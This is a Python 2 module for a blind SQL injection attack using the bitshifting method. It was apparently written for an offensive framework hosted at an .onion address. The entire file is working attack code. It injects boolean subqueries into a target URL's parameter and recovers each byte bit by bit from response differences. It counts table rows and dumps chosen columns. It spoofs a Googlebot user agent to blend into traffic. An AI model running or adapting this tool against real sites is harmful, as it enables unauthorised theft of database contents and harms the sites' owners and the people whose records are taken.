#!/usr/bin/python2

# Blind SQL Injection via Bitshifting Method
# Method by Jelmer de Hen (https://www.exploit-db.com/papers/17073/)
# Module written by Eclipse of Team Salvation
# Module written for implementation in WHFramework (http://ljdbosgro7jj4z7r.onion)

import requests
from itertools import izip_longest as izipl

options = {
	"target" : "www.example.com/index.php?id=1",
	"cookies" : "",
	"row_condition" : "1",
	"follow_redirections" : 0,
	"user_agent" : "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
	"table_name" : "",
	"columns" : "col1,col2",
	"truth_string" : ""
}

dump = []

def colored(text, color):
	if (color == "red"):
		return "\033[91m" + text + "\033[0m"
	elif (color == "green"):
		return "\033[92m" + text + "\033[0m"
	elif (color == "blue"):
		return "\033[94m" + text + "\033[0m"

def fix_host(host):
    if ((not host.startswith("http://")) and (not host.startswith("https://"))):
        return "http://" + host
    if (host.endswith("/")):
        return host[:-1]

def request(target):
    headers = {"user-agent" : options["user_agent"]}
    return requests.get(target, headers=headers, cookies=options["cookies"], allow_redirects=bool(options["follow_redirections"])).text

def getNumberOfRows():
    count = 1
    s = ''
    while True:
        target = '%s and ((select ascii(substr(count(%s), {index}, 1)) from %s)>>{shift})={result}' % (options['target'], options['columns'].split(',')[0], options['table_name'])
        target = target.replace('{index}', str(count))
        char = getChar(target)
        if char == 1:
            return int(s)
        else:
            s += str(char)
            count += 1

def getChar(target):
    otarget = target
    byte = ''
    for x in range(8):
        target = otarget
        next_if_set = int(byte+'1', 2)
        target = target.replace('{shift}', str(7-x))
        target = target.replace('{result}', str(next_if_set))
        response = request(target)
        if options['truth_string'] in response:
            byte += '1'
        else:
            byte += '0'
    if byte == '00000000':
        return 1
    else:
        return chr(int(byte, 2))
		
def exploit():
    options["target"] = fix_host(options["target"])
    columns = options['columns'].split(',')
    for column in columns:
        dump.append(column)
    if options["row_condition"] != '1':
        for column in columns:
            count = 1
            s = ''
            while True:
                target = '%s and ((select ascii(substr(%s, {index}, 1)) from %s where %s)>>{shift})={result}' % (options['target'], column, options['table_name'], options['row_condition'])
                target = target.replace('{index}', str(count))
                char = getChar(target)
                if char == 1:
                    break
                else:
                    s += str(char)
                    count += 1
            dump.append(s)
    else:
        no_of_rows = getNumberOfRows()
        for x in range(no_of_rows):
            for column in columns:
                count = 1
                s = ''
                while True:
                    target = '%s and ((select ascii(substr(%s, {index}, 1)) from %s limit {row_index},1)>>{shift})={result}' % (options['target'], column, options['table_name'])
                    target = target.replace('{row_index}', str(x))
                    target = target.replace('{index}', str(count))
                    char = getChar(target)
                    if char == 1:
                        break
                    else:
                        count += 1
                        s += str(char)
                dump.append(s)
    print colored('[+] Data successfully dumped!', 'green')
    print colored('[+] Data:', 'green')
    for cell in izipl(fillvalue='', *[iter(dump)]*(len(columns))):
        print '\t'.join(cell)
    return dump #return unformatted dump anyway so that exploit authors can optionally format themselves
